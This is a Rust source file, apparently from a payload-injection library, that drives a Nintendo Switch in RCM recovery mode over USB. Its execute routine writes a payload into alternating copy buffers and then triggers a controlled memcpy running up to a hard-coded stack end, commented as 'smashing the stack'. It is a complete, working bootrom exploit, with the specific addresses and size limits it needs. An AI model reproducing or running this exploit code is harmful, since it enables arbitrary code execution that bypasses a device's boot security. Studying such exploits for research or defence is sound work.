use std::ops::DerefMut;

use tracing::debug;

use crate::Result;

use crate::device::{Device, DeviceRaw, SwitchDevice, SwitchDeviceRaw};
use crate::vulnerability::Vulnerability;
use crate::Payload;

/// The current state of the Buffer
#[derive(Default, Debug, Clone, Copy, PartialEq, Eq)]
enum BufferState {
    #[default]
    Low,
    High,
}

impl BufferState {
    /// Toggle the buffer
    fn toggle(&mut self) {
        match self {
            BufferState::High => *self = BufferState::Low,
            BufferState::Low => *self = BufferState::High,
        }
    }

    /// Gets the address of the buffer
    fn address(&self) -> usize {
        const COPY_BUFFER_ADDRESSES_LOW: usize = 0x40005000;
        const COPY_BUFFER_ADDRESSES_HIGH: usize = 0x40009000;
        match *self {
            BufferState::Low => COPY_BUFFER_ADDRESSES_LOW,
            BufferState::High => COPY_BUFFER_ADDRESSES_HIGH,
        }
    }
}

/// An RCM connection object
/// This is the main interface to communicate with the switch
#[derive(Debug)]
pub struct Switch {
    switch: SwitchDevice,
    current_buffer: BufferState,
    total_written: usize,
}

impl Switch {
    /// Create a new Rcm object from an existing SwitchDevice
    /// Should not have its interface claimed yet
    pub(crate) fn with_device(device: SwitchDevice) -> Result<Self> {
        device.validate_environment()?;

        Ok(Self {
            switch: device,
            current_buffer: BufferState::Low,
            total_written: 0,
        })
    }

    /// Finds and connects to a device in RCM mode
    /// This will error out if no device is connected unless wait: true is passed
    /// If wait: true is passed this will block until it detects a switch device in RCM mode
    pub fn new() -> Option<Result<Self>> {
        let switch = match SwitchDeviceRaw::default().find_device()? {
            Ok(s) => s,
            Err(e) => return Some(Err(e)),
        };

        Some(Ok(Self {
            switch,
            current_buffer: BufferState::Low,
            total_written: 0,
        }))
    }

    /// Used to initialize the RCM device connection, this should only be done once
    /// and should be done before interacting in any way
    fn init(&mut self) -> Result<()> {
        self.switch.init()?;
        Ok(())
    }

    /// This will execute the payload on the connected device
    /// This consumes the device
    pub fn execute(mut self, payload: &Payload) -> Result<()> {
        self.init()?;
        let _ = self.read_device_id();

        self.write(payload.data())?;
        self.switch_to_highbuf()?;

        // smashing the stack
        self.trigger_controlled_memcopy()
    }

    /// Writes data to the RCM protocol endpoint
    fn write(&mut self, buf: &[u8]) -> Result<usize> {
        const PACKET_SIZE: usize = 0x1000;
        const MAX_LENGTH: usize = 0x30298;

        assert!(buf.len() <= MAX_LENGTH);

        let mut remaining_buf = buf;
        let mut length_remaining = buf.len();

        let mut written = 0;

        while length_remaining != 0 {
            let data_to_transmit = length_remaining.min(PACKET_SIZE);
            length_remaining -= data_to_transmit;

            let chunk = &remaining_buf[..data_to_transmit];
            remaining_buf = &remaining_buf[data_to_transmit..];
            match self.write_buffer(chunk) {
                Ok(size) => written += size,
                Err(e) => return Err(e),
            };
        }
        // update the current amount of bytes written
        self.total_written += written;

        Ok(written)
    }

    fn current_buff_addr(&self) -> usize {
        self.current_buffer.address()
    }

    fn switch_to_highbuf(&mut self) -> Result<()> {
        if self.current_buffer != BufferState::High {
            let buf = &[b'\0'; 0x1000];
            self.write(buf)?;
        }
        Ok(())
    }

    fn trigger_controlled_memcopy(&self) -> Result<()> {
        debug!(
            "Wrote a total of {} bytes to the switch, performing the controlled memcopy",
            self.total_written
        );

        const STACK_END: usize = 0x40010000;
        let length = STACK_END - self.current_buff_addr();
        self.trigger_controlled_memcopy_length(length)?;
        Ok(())
    }

    fn trigger_controlled_memcopy_length(&self, length: usize) -> Result<()> {
        self.switch.trigger(length)?;
        Ok(())
    }

    fn write_buffer(&mut self, buf: &[u8]) -> Result<usize> {
        self.toggle_buffer();
        let written = self.switch.write(buf)?;
        Ok(written)
    }

    fn toggle_buffer(&mut self) {
        self.current_buffer.toggle();
    }

    /// Read from the device
    fn read(&mut self, buf: &mut [u8]) -> Result<usize> {
        let read = self.switch.read(buf)?;
        Ok(read)
    }

    /// Reads the device ID
    /// Note: The is a necessary step before executing
    fn read_device_id(&mut self) -> Result<Box<[u8; 16]>> {
        let mut buf = Box::new([b'\0'; 16]);
        self.read(buf.deref_mut())?;
        Ok(buf)
    }
}
